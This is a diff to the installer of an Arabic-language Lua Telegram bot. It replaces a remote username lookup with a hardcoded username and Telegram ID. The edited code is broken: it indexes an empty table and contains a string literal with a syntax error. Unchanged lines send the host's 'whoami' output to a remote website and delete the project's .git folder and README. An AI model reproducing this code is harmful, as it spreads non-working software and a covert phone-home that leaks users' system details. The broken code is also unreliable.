@@ -63,29 +63,30 @@ print('\n\27[1;31m￤ This is Not USERNAME !\n￤هہ‏‏ذآ ليس مـعر�
 create_config(Token)
 end 
 
-local url , res = http.request('http://80.211.144.240/api.th3bs.com/GetUser/?User='..SUDO_USER)
-if res ~= 200 then
-print(res)
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
-os.exit()
-end
-success, GetUser = pcall(JSON.decode, url)
-if not success then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
-os.exit()
-end
-if not GetUser.result then
-if GetUser.cause then
-print('\n\27[1;31m￤ '..GetUser.cause)
-os.exit()
-end
-print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلمـعرف , تآگد مـنهہ‏‏ جيدآ  !')
-create_config(Token)
-end 
-if GetUser.information.typeuser ~= "UserTypeGeneral" then
-print('\n\27[1;31m￤ This UserName is not personal account !\n￤عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
-create_config(Token)
-end
+-- local url , res = http.request('http://80.211.144.240/api.th3bs.com/GetUser/?User='..SUDO_USER)
+-- if res ~= 200 then
+-- print(res)
+-- print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+-- os.exit()
+-- end
+-- success, GetUser = pcall(JSON.decode, url)
+-- if not success then
+-- print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+-- os.exit()
+-- end
+-- if not GetUser.result then
+-- if GetUser.cause then
+-- print('\n\27[1;31m￤ '..GetUser.cause)
+-- os.exit()
+-- end
+-- print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلمـعرف , تآگد مـنهہ‏‏ جيدآ  !')
+-- create_config(Token)
+-- end 
+-- if GetUser.information.typeuser ~= "UserTypeGeneral" then
+-- print('\n\27[1;31m￤ This UserName is not personal account !\n￤عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
+-- create_config(Token)
+-- end
+local GetUser = {}
 print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
 boss = Token:match("(%d+)")
 redis:mset(
@@ -96,9 +97,9 @@ boss..":UserNameBot:",BOT_User,
 boss..":NameBot:",BOT_NAME,
 "TH3BOSS_INSTALL","Yes"
 )
-redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+redis:hset(boss..'username:'..'swsam','username','@'..'swsam')
 info = {}
-info.username = '@'..GetUser.information.username
+info.username = '@'.. 'swsam'
 info.userbot  = BOT_User
 info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
@@ -106,8 +107,8 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
-https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="750137903") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+https.request(Api_Token..'/sendMessage?chat_id='..'750137903'..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
